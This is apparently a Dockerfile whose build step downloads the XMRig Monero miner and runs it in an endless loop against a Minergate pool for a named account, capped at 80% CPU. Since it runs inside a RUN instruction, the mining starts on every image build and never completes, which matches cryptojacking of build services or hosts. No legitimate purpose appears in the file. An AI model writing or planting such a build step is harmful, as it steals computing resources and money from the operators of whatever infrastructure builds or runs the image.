FROM ubuntu:xenial
RUN apt-get update && apt-get install -y wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz && tar -xf xmrig-2.11.0-xenial-x64.tar.gz && cd xmrig-2.11.0 && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 2 --max-cpu-usage=80 --cpu-priority 3 --donate-level 1 ; sleep 1; done
